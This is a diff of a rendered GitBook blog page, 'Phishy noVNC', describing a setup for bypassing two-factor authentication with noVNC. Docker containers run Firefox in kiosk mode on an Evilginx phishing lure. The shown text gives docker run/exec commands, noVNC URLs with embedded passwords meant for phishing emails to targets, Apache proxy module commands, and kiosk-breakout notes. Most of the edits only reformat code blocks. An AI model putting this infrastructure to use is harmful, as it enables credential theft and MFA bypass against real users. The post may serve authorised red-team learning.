@@ -358,7 +358,7 @@
 sudo ./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 80 &amp;
 env DISPLAY=:1 firefox -P 1 https://accounts.google.com/signin --kiosk &amp;
 env DISPLAY=:1 firefox -CreateProfile 1
-</code></pre>Given these issues, I went down the rabbit hole to improve this killer concept.</li>
+</code></pre>Given these issues, I went down the rabbit hole to build on this killer concept.</li>
 </ul>
 <h4 id="docker-to-the-rescue">Docker to the rescue</h4>
 <p>I then went on an adventure for solutions, tried various noVNC docker containers with hit and miss issues on each, finally settled on <a href="https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3" target="_blank">https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3</a> as it ran a light system, was about 500MB, and already had noVNC running.</p>
@@ -444,41 +444,41 @@ NameVirtualHost *
 <ul>
 <li>stretch out creating the docker commands to spin up the containers</li>
 <li>run firefox with the phishing landing page already loaded in kiosk mode</li>
-<li>then the noVNC URL I&apos;ll include in the phishing email to each target
-```
-docker run -d --add-host ssl1.fhlipzero.io:172.31.42.77 -p6901:6901 --name  user1 firefox/CLIENT:latest
-docker run -d --add-host ssl1.fhlipzero.io:172.31.42.77 -p6902:6901 --name  user2 firefox/CLIENT:latest</li>
+<li>then the noVNC URL I&apos;ll include in the phishing email to each target</li>
 </ul>
-<p>docker exec user1 sh -c &quot;env DISPLAY=:1 firefox <a href="https://ssl1.fhlipzero.io/redirect" target="_blank">https://ssl1.fhlipzero.io/redirect</a> --kiosk &amp;&quot;
-docker exec user2 sh -c &quot;env DISPLAY=:1 firefox <a href="https://ssl1.fhlipzero.io/redirect" target="_blank">https://ssl1.fhlipzero.io/redirect</a> --kiosk &amp;&quot;</p>
-<p><a href="http://ssl1.fhlipzero.io/okta.html?autoconnect=true&amp;resize=remote&amp;password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v" target="_blank">http://ssl1.fhlipzero.io/okta.html?autoconnect=true&amp;resize=remote&amp;password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v</a>
-<a href="http://ssl2.fhlipzero.io/okta.html?autoconnect=true&amp;resize=remote&amp;password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v" target="_blank">http://ssl2.fhlipzero.io/okta.html?autoconnect=true&amp;resize=remote&amp;password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v</a></p>
-<p>Setup x number of A records poiting back to each subdomain   </p>
-<p>Setup the virtualhost file in apache to handle the subdomains   </p>
-<p>Evilginx is a single lure for me to capture creds on, I can track per user by the noVNC logs later   </p>
-<pre><code>My t3a (2 vCPU and 8GB ram) is running 20 containers pretty well right now   
+<pre><code>docker run -d --add-host ssl1.fhlipzero.io:172.31.42.77 -p6901:6901 --name  user1 firefox/CLIENT:latest
+docker run -d --add-host ssl1.fhlipzero.io:172.31.42.77 -p6902:6901 --name  user2 firefox/CLIENT:latest
 
+docker exec user1 sh -c &quot;env DISPLAY=:1 firefox https://ssl1.fhlipzero.io/redirect --kiosk &amp;&quot;
+docker exec user2 sh -c &quot;env DISPLAY=:1 firefox https://ssl1.fhlipzero.io/redirect --kiosk &amp;&quot;
 
-Some OPSEC considerations - kiosk breakout is very possible, you can easily get into the firefox settings and then start roaming the system as the docker headless user. I was able to pop the browser console open by hitting ALT + SHIFT + J, then hit right click the menu bar and &quot;Minimize all other windows&quot;. From there its a desktop right click and &quot;Terminal&quot; away from desktop access here. 
+http://ssl1.fhlipzero.io/okta.html?autoconnect=true&amp;resize=remote&amp;password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v
+http://ssl2.fhlipzero.io/okta.html?autoconnect=true&amp;resize=remote&amp;password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v
 
-&lt;img src=&quot;error.png&quot; alt=&quot;breakout&quot; width=&quot;500&quot;/&gt;  
-This was a whole ass day just to tuck evilginx into a weird container and keep it safe... god i hope it works. Giant shoutout to mrd0x, this was an awesome dive to go down and gives me more ideas of how this could be used.
-</code></pre><p>scrap notes on docker commands / </p>
-<p>docker stop $(docker ps -a -q)
-docker rm $(docker ps -a -q)</p>
-<p>modules i needed to enable in apache to<br> make the rewrite / proxy tinkering work</p>
-<p>sudo a2enmod proxy
+Setup x number of A records poiting back to each subdomain   
+
+Setup the virtualhost file in apache to handle the subdomains   
+
+Evilginx is a single lure for me to capture creds on, I can track per user by the noVNC logs later
+</code></pre><p>My t3a (2 vCPU and 8GB ram) is running 20 containers pretty well right now   </p>
+<p>Some OPSEC considerations - kiosk breakout is very possible, you can easily get into the firefox settings and then start roaming the system as the docker headless user. I was able to pop the browser console open by hitting ALT + SHIFT + J, then hit right click the menu bar and &quot;Minimize all other windows&quot;. From there its a desktop right click and &quot;Terminal&quot; away from desktop access here. </p>
+<p><img src="error.png" alt="breakout" width="500"><br>This was a whole ass day just to tuck evilginx into a weird container and keep it safe... god i hope it works. Giant shoutout to mrd0x, this was an awesome dive to go down and gives me more ideas of how this could be used.</p>
+<h4 id="future-improvements">future improvements:</h4>
+<p>Definitely some scripting to automate spinning up all the instances cause I&apos;m annoyed at having to use excel sheets but it does the job, I also bloated the container image from 600 to 850 which still isnt bad, just messy. </p>
+<pre><code>scrap notes on docker commands
+
+docker stop $(docker ps -a -q)
+docker rm $(docker ps -a -q)
+
+modules i needed to enable in apache to make the rewrite / proxy tinkering work
+
+sudo a2enmod proxy
 sudo a2enmod proxy_http
 sudo a2enmod proxy_balancer
 sudo a2enmod lbmethod_byrequests
 sudo a2enmod proxy_wstunnel
 sudo a2enmod rewrite
-```</p>
-<p><a href="https://mrd0x.com/bypass-2fa-using-novnc/" target="_blank">https://mrd0x.com/bypass-2fa-using-novnc/</a>
-<a href="https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3" target="_blank">https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3</a>
-<a href="https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/" target="_blank">https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/</a>
-<a href="https://www.digitalocean.com/community/tutorials/how-to-use-apache-http-server-as-reverse-proxy-using-mod_proxy-extension" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-use-apache-http-server-as-reverse-proxy-using-mod_proxy-extension</a>
-<a href="https://github.com/novnc/noVNC/blob/master/app/ui.js" target="_blank">https://github.com/novnc/noVNC/blob/master/app/ui.js</a></p>
+</code></pre><p><a href="https://mrd0x.com/bypass-2fa-using-novnc/" target="_blank">https://mrd0x.com/bypass-2fa-using-novnc/</a><br><a href="https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3" target="_blank">https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3</a><br><a href="https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/" target="_blank">https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/</a><br><a href="https://www.digitalocean.com/community/tutorials/how-to-use-apache-http-server-as-reverse-proxy-using-mod_proxy-extension" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-use-apache-http-server-as-reverse-proxy-using-mod_proxy-extension</a><br><a href="https://github.com/novnc/noVNC/blob/master/app/ui.js" target="_blank">https://github.com/novnc/noVNC/blob/master/app/ui.js</a>   </p>
 
                                 
                                 </section>
@@ -522,7 +522,7 @@ sudo a2enmod rewrite
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Phishy noVNC","level":"2.1","depth":1,"next":{"title":"M1 Macs","level":"2.2","depth":1,"path":"blogs/4_m1_macs/m1_macs.md","ref":"blogs/4_m1_macs/m1_macs.md","articles":[]},"previous":{"title":"fhlipzero.io","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":["custom-favicon","remove-published-with-link","-sharing","collapsible-menu","wide-page"],"root":"/","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"collapsible-menu":{},"search":{},"wide-page":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":"avatar.ico","custom-favicon":{},"remove-published-with-link":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"fontsettings":{"theme":"night"},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"blogs/6_noVNC/noVNC.md","mtime":"2022-03-17T15:50:03.567Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-03-17T15:51:11.272Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Phishy noVNC","level":"2.1","depth":1,"next":{"title":"M1 Macs","level":"2.2","depth":1,"path":"blogs/4_m1_macs/m1_macs.md","ref":"blogs/4_m1_macs/m1_macs.md","articles":[]},"previous":{"title":"fhlipzero.io","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":["custom-favicon","remove-published-with-link","-sharing","collapsible-menu","wide-page"],"root":"/","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"collapsible-menu":{},"search":{},"wide-page":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":"avatar.ico","custom-favicon":{},"remove-published-with-link":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"fontsettings":{"theme":"night"},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"blogs/6_noVNC/noVNC.md","mtime":"2022-03-17T16:22:21.453Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-03-17T16:23:29.793Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
